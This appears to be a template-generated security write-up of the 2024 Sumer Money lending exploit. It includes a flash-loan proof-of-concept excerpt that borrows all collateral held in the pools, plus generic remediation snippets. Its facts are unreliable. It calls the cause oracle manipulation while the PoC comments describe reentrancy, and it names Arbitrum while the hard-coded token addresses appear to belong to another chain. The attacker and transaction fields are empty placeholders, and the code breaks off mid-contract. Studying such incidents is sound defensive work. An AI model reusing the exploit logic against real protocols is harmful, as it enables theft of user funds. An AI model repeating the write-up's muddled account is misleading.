# Sumer Money — Collateral Price Oracle Manipulation for Over-Borrowing Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04-25 |
| **Protocol** | Sumer Money |
| **Chain** | Arbitrum |
| **Loss** | Unconfirmed |
| **Attacker** | [0x](https://arbiscan.io/address/0x) |
| **Attack Tx** | [0x](https://arbiscan.io/tx/0x) |
| **Vulnerable Contract** | [0x](https://arbiscan.io/address/0x) |
| **Root Cause** | Over-borrowing via collateral price oracle manipulation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/SumerMoney_exp.sol) |

---
## 1. Vulnerability Overview

Sumer Money is a DeFi protocol operating on the Arbitrum chain that suffered a **collateral / oracle manipulation** attack on 2024-04-25.
The attacker exploited over-borrowing via collateral price oracle manipulation, resulting in an estimated loss of **unconfirmed** value.

### Key Vulnerability Summary
- **Classification**: Collateral / Oracle Manipulation
- **Impact**: Unconfirmed protocol asset loss
- **Attack Vector**: Oracle manipulation

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Vulnerable implementation example
// Issue: Over-borrowing via collateral price oracle manipulation
// The attacker exploits this logic to gain illegitimate profit

// Sumer Money interface — collateral oracle manipulation vulnerable functions
interface IClaimer {
    // ❌ Vulnerable: on claim execution, tokenId-based collateral value is calculated using spot price
    // Flash loan can temporarily inflate NFT/collateral price, enabling mass claims
    function claim(uint256[] calldata tokenIds) external;
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface crETH {
    // ❌ Vulnerable: mint/borrow processed based on instantaneous ETH price
    function mint() external payable returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function repayBorrowBehalf(address borrower) external payable returns (uint256);
    function exchangeRateCurrent() external returns (uint256);
}

interface ICErc20Delegate {
    // ❌ Vulnerable: collateral ratio calculated based on manipulated oracle price
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
}

// ✅ Correct implementation: Chainlink oracle + block claims during flash loan
function safeClaim(uint256[] calldata tokenIds) external nonReentrant {
    // ✅ Block claims while flash loan is active
    require(!balancerFlashActive, "Claim: flash loan active");
    // ✅ Verify collateral value via Chainlink oracle (instead of spot price)
    for (uint256 i = 0; i < tokenIds.length; i++) {
        uint256 claimValue = getChainlinkValue(tokenIds[i]);
        require(claimValue > 0, "Claim: invalid oracle price");
    }
    _processClaim(tokenIds);
}
```

---
## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Flash Loan] ──── Liquidity Pool
  │
  ▼
[Oracle Price Manipulation] ─ Price Feed Contract
  │                              (TWAP/Spot Price Distortion)
  ▼
[Over-Borrowing/Liquidation] ── Lending Protocol
  │
  ▼
[Repay & Secure Profit]
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - SumerMoney_exp.sol
// Chain: Arbitrum | Date: 2024-04-25

    function testExploit() public {
        deal(address(this), 1);
        address[] memory tokens = new address[](2);
        tokens[0] = address(WETH);
        tokens[1] = address(USDC);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 150 ether;
        amounts[1] = 645_000 * 1e6;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);

        emit log_named_decimal_uint("Attacker USDC Balance After exploit", USDC.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("Attacker cbETH Balance After exploit", cbETH.balanceOf(address(this)), 18);
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        WETH.withdraw(amounts[0]);

        // sdrETH.exchangeRate
        emit log_named_decimal_uint("Before re-enter, sdrETH exchangeRate", sdrETH.exchangeRateCurrent(), 18);

        sdrETH.mint{value: amounts[0]}();

        helper = new Helper{value: 1}();
        USDC.transfer(address(helper), amounts[1]);
        helper.borrow(amounts[1]);

        WETH.deposit{value: amounts[0]}();
        WETH.transfer(address(Balancer), amounts[0]);
        USDC.transfer(address(Balancer), amounts[1]);
    }

    function attack() external {
        // exchangeRate == getCashPrior() + totalBorrows - totalReserves / totalSupply
        // In function repayBorrowBehalf(), getCashPrior() increase 150 ether but totalBorrows not decreased due to re-enter
        emit log_named_decimal_uint("In re-enter, sdrETH exchangeRate", sdrETH.exchangeRateCurrent(), 18);

        sdrcbETH.borrow(cbETH.balanceOf(address(sdrcbETH)));
        sdrUSDC.borrow(USDC.balanceOf(address(sdrUSDC)) - 645_000 * 1e6);
        sdrETH.redeemUnderlying(150 ether);
        uint256[] memory tokenIds = new uint256[](2);
        tokenIds[0] = 309;
        tokenIds[1] = 310;
        claimer.claim(tokenIds);
    }

    receive() external payable {}
}

contract Helper {
    address owner;
    IWETH WETH = IWETH(payable(address(0x4200000000000000000000000000000000000006)));
    IERC20 USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    IERC20 cbETH = IERC20(0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22);
    crETH sdrETH = crETH(payable(address(0x7b5969bB51fa3B002579D7ee41A454AC691716DC)));
```

> **Note**: The code above is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Criteria | Details |
|-----------|------|
| **DASP Top 10** | Oracle Manipulation |
| **Attack Type** | Price Feed Manipulation |
| **Vulnerability Category** | Economic Attack |
| **Attack Complexity** | Medium |
| **Preconditions** | Access to vulnerable function |
| **Impact Scope** | Partial assets |
| **Patchability** | High (resolvable via code fix) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Pause vulnerable functions**: Apply emergency pause to the affected functions
2. **Assess damage**: Quantify lost assets and identify affected users
3. **Notify relevant parties**: Immediately notify related DEXes, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (use OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: update state
    balances[msg.sender] -= amount;
    // 3. Interactions: external calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Oracle manipulation prevention (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not rely solely on current spot price
}
```

### Long-Term Improvements
- Conduct **independent security audits** (at least 2 auditing firms)
- Operate a **bug bounty program**
- Build a **monitoring system** (Forta, OpenZeppelin Defender, etc.)
- Implement an **emergency stop mechanism**

---
## 7. Lessons Learned

### For Developers
1. **Collateral / oracle manipulation attacks are preventable**: Proper validation and pattern application can serve as a defense
2. **Consider economic incentives**: Design every function with the attacker's economic motivation in mind
3. **Audit priority**: Functions that directly handle assets should be the top audit priority

### For Protocol Operators
1. **Real-time monitoring**: Establish a system to immediately detect abnormal large-scale transactions
2. **Incident response plan**: Maintain an actionable response manual ready to execute upon attack
3. **Insurance**: Diversify risk through DeFi insurance protocols

### For the DeFi Ecosystem at Large
- The **2024-04-25** Sumer Money incident reconfirms the danger of **collateral / oracle manipulation** attacks in the Arbitrum ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Strengthening community-wide security information sharing is recommended

---
*This document was prepared for educational and security research purposes. Do not misuse.*
*PoC source: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/SumerMoney_exp.sol)*